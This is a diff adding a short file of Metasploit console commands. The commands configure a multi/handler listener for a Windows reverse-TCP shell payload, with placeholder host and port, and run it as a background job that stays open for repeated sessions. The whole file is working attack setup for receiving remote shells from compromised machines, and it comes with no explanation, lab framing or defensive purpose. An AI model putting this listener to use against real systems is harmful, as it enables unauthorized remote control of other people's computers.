@@ -1,0 +1,7 @@
+msfconsole
+use multi/handler
+set LHOST [ip]
+set LPORT [port]
+set payload windows/shell_reverse_tcp
+set ExitOnSession false
+exploit -j
